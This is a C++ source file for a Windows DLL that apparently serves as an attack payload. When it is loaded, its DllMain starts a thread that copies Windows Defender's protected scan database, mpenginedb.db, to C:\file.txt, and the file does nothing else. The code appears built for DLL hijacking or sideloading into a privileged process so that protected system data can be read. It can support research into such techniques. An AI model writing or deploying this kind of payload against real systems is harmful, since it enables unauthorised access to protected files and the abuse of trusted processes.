#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct _SrcDst {
    wchar_t src[MAX_PATH];
    wchar_t dst[MAX_PATH];
} SrcDst;


extern "C" __declspec(dllexport) BOOL DoCopyFile(const wchar_t* src, const wchar_t* dst) {
    if (!src || !dst) {
        printf("[!] Source and Dest must be defined\n");
        return FALSE;
    }

    if (CopyFileW(src, dst, FALSE)) { // overwrite if exists
        wprintf(L"[*] Copied %s to %s\n", src, dst);
        return TRUE;
    }
    else {
        wprintf(L"[*] Failed to copy %s to %s. Error: %lu\n", src, dst, GetLastError());
        return FALSE;
    }
}

DWORD WINAPI CopyFileThreadProc(LPVOID lpParam) {
    SrcDst* sd = (SrcDst*)lpParam;
    if (sd == NULL) return 1;

    DoCopyFile(sd->src, sd->dst);

    free(sd);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);

        SrcDst* sd = (SrcDst*)malloc(sizeof(SrcDst));
        if (sd == NULL) {
            return FALSE;
        }

        wcscpy_s(sd->src, MAX_PATH, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpenginedb.db");
        wcscpy_s(sd->dst, MAX_PATH, L"C:\\file.txt");

        HANDLE hThread = CreateThread(NULL, 0, CopyFileThreadProc, sd, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        else {
            free(sd);
        }
    }
    return TRUE;
}